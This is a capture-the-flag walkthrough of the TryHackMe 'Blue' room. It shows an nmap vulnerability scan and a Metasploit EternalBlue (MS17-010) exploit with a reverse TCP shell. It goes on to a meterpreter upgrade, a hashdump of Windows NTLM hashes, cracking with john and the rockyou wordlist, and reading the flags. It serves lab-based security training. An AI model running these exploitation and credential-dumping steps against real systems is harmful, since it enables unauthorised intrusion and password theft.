# Blue

- [Tools](#tools)
- [Recon](#recon)
- [Gain Access](#gain-access)
- [Escalate](#escalate)
- [Cracking](#cracking)
- [Find flags](#find-flags)

Room Link: [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)

Badges: [https://tryhackme.com/ZishanAdThandar/badges/blue](https://tryhackme.com/ZishanAdThandar/badges/blue)

## Tools 

1. NMap https://nmap.org/download
2. Metasploit https://www.metasploit.com/download

## Recon

1. Scan with nmap using command, `nmap 10.10.248.180 --script vuln -p0-1000`

Output:
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-27 10:57 IST
Nmap scan report for 10.10.248.180
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: ERROR: Script execution failed (use -d to debug)
|_smb-double-pulsar-backdoor: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-conficker: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-cve-2017-7494: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms06-025: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms07-029: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms08-067: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
```
2. Question `How many ports are open with a port number under 1000?` Answer `3`
3. Question `What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)` Answer `ms17-010`

## Gain Access

1. Start Metasploit with `msfconsole`
2. Following next question, searched exploit in metasploit console with `search ms17-010` command
Output:
```bash
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
3. Question `Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)` Ansswer `exploit/windows/smb/ms17_010_eternalblue`
4. To use the exploit we typed `use exploit/windows/smb/ms17_010_eternalblue` command
5. After checkinh options with `options` command, we found that we need to add rhosts with `set rhosts 10.10.248.180` and `set lhost tun0` command
6. Question `Show options and set the one required value. What is the name of this value? (All caps for submission)` Answer `RHOSTS`

## Escalate 
1. Used payload with command `set payload windows/x64/shell/reverse_tcp`
2. Then `run` and wait for some time.
3. `search shell_to_meterpreter` to find module to upgrade session to meterpreter.
Output:
```bash
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
```
4. Question `If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)` Answer `post/multi/manage/shell_to_meterpreter`
5. Question `Select this (use MODULE_PATH). Show options, what option are we required to change?` Answer `SESSION`
6. Run the module after setting session. If fails run it again, it will connect.
```bash
meterpreter > shell
Process 808 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ps
ps
'ps' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>exit
exit
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 416   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM  ...........
...............................................................................
...............................................................................
```
7. Use `migrate PROCESS_ID` to mmigrate.

## Cracking
1. Use `hashdump` to hashes.
Output:
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
2. Question `Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?` Answer `Jon`
3. Save hashes in a file named `hash.txt` and use `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` to crack the hash.
4. Question `Copy this password hash to a file and research how to crack it. What is the cracked password?` Answer `*******`

## Find flags
1. We can goto `C:\\` abd get first flag using `cat flag1.txt`.
```bash
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:\\
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 08:43:36 +0530  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 10:38:56 +0530  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 08:50:08 +0530  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-18 03:52:01 +0530  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-18 03:58:38 +0530  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-18 04:05:57 +0530  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 08:43:22 +0530  Recovery
040777/rwxrwxrwx  4096   dir   2019-03-18 04:05:55 +0530  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 08:43:28 +0530  Users
040777/rwxrwxrwx  16384  dir   2019-03-18 04:06:30 +0530  Windows
100666/rw-rw-rw-  24     fil   2019-03-18 00:57:21 +0530  flag1.txt
000000/---------  0      fif   1970-01-01 05:30:00 +0530  hiberfil.sys
000000/---------  0      fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag1.txt
flag{********************************}
```
2. We can use `search -f flag2.txt` and `search -f flag2.txt` to find second and third flag to submit, as we already know the first one.
```bash
meterpreter > search -f flag2.txt
Found 1 result...
=================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Windows\System32\config\flag2.txt  34            2019-03-18 01:02:48 +0530

meterpreter > cat c:\Windows\System32\config\flag2.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat "c:\Windows\System32\config\flag2.txt"
flag{********************************s}
meterpreter > search -f flag3.txt
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 00:56:36 +0530

meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
flag{********************************}
```
3. flag1 : `flag{********************************}` flag2: `flag{********************************}` flag3:`flag{********************************}`

Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
